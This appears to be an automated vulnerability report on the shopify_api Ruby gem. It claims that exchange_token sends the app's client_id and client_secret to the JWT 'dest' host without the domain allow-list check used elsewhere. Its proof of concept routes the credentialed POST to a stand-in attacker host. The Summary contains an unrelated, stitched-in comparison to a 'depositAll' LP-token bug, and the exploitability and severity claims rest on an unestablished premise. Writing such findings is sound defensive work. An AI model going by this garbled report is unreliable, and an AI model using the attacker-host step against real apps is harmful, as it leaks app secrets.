### Title
Unsanitized `dest`-claim host used as request destination in `TokenExchange.exchange_token` allows the app's `client_id`/`client_secret` to be sent to an unvalidated shop host - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` takes the `shop` value straight from the session (ID) token's `dest` claim and uses it, unsanitized, as the host to which it POSTs the app's `client_id` and `client_secret`. Every other credential-issuing flow in this gem (`ClientCredentials.client_credentials`, `TokenExchange.migrate_to_expiring_token`) runs the `shop` value through `Utils::ShopValidator.sanitize!` before building a `Session`/`HttpClient`, but `exchange_token` does not. This is the same bug class as the reported issue: a value that is trusted implicitly downstream (the LP-token amount for `depositAll`) is not actually bound/validated the way the code elsewhere assumes it is (the explicit `amount` used by `deposit`).

### Finding Description
`JwtPayload#shop` derives the shop host from the token's `dest` claim with a bare string substitution and no domain validation: [1](#0-0) 

`TokenExchange.exchange_token` then uses this unsanitized value directly to build the `Session` that is handed to `HttpClient`: [2](#0-1) 

`HttpClient#initialize` builds the request's base URI directly from `session.shop` (unless an explicit `api_host` override is configured): [3](#0-2) 

The POST body built in `exchange_token` includes the app's `client_id` and `client_secret` in plaintext, and is sent to that unvalidated host: [4](#0-3) 

Compare this to the two sibling credential-granting flows in the same file/module, which both call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the credentialed request: [5](#0-4) [6](#0-5) 

`ShopValidator.sanitize!` exists precisely to restrict a shop-domain-like string down to a small allow-list of trusted Shopify TLDs (`myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`, `shopify.com`) and reject anything else: [7](#0-6) 

`exchange_token` skips this check entirely, so the equality the rest of the codebase relies on — "the host that receives the `client_secret` == a value validated against `TRUSTED_SHOPIFY_DOMAINS`" — does not hold for the token-exchange path. The `dest` claim only needs to contain a hostname string that was not restricted to the trusted-domain allow-list at the point it was placed in the token by whatever issued it; nothing in this gem re-validates it before it is used as an outbound request destination carrying the app's `client_secret`.

### Impact Explanation
If the `dest` value used to construct the outbound request host is not constrained to Shopify's own domains, the app's `client_id` and `client_secret` — its most sensitive long-lived credential — are transmitted to a host outside Shopify's control. This matches the "High: SSRF with the app's credentials" impact category: the gem itself constructs and sends a credentialed HTTP request to a destination host that was never checked against the trusted-domain allow-list that the library uses everywhere else for exactly this purpose.

### Likelihood Explanation
The likelihood is tied directly to how permissive the upstream `dest` claim is. Because this is the *only* place among the three OAuth-credential-issuing methods that omits `ShopValidator.sanitize!`, it is an inconsistency/gap in the library's own trust boundary rather than a documented, intentional design choice — the existence of `sanitize!` and its use in the two sibling methods shows the library's own authors consider raw shop strings unsafe to use as a request host without this check.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (as is already done in `migrate_to_expiring_token` and `ClientCredentials.client_credentials`) before constructing `shop_session` and issuing the token-exchange request, so that the shop host used to receive `client_id`/`client_secret` is always validated against `TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain/produce a session (ID) token whose `dest` claim is not restricted to a `TRUSTED_SHOPIFY_DOMAINS` suffix (e.g. `dest: "https://attacker.example.com"`).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. Observe that `JwtPayload#shop` returns `attacker.example.com` unmodified (`lib/shopify_api/auth/jwt_payload.rb:47-51`), that no `ShopValidator.sanitize!` call filters it in `exchange_token` (`lib/shopify_api/auth/token_exchange.rb:39-65`), and that `HttpClient` subsequently issues `POST https://attacker.example.com/admin/oauth/access_token` with a JSON body containing `client_id` and `client_secret` (`lib/shopify_api/clients/http_client.rb:16-19`).

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
